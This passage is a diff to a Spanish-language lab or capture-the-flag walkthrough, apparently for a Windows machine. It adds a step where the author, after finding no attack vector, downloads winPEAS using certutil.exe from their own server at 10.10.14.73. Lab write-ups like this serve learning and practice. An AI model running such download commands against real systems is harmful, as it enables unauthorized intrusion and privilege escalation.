@@ -325,5 +325,11 @@ con un servidor compartimos el archivo para posteriormente llamarlo y obtener un
 ![[Pasted image 20240724155109.png]]
 
 ### WinPEAS.exe
-despues de enumerar un buen rato el sistema no hemos encontrado un vector de ataque asi que vamos a usar la herramienta `winpeas` para intentar 
+después de enumerar un buen rato el sistema no hemos encontrado un vector de ataque así que vamos a usar la herramienta `winpeas` para enumerar mas a fondo
+
+```python
+certutil.exe -f -urlcache -split http://10.10.14.73:9006/winPEASx64.exe
+```
+
 ![[Pasted image 20240724160615.png]]
+
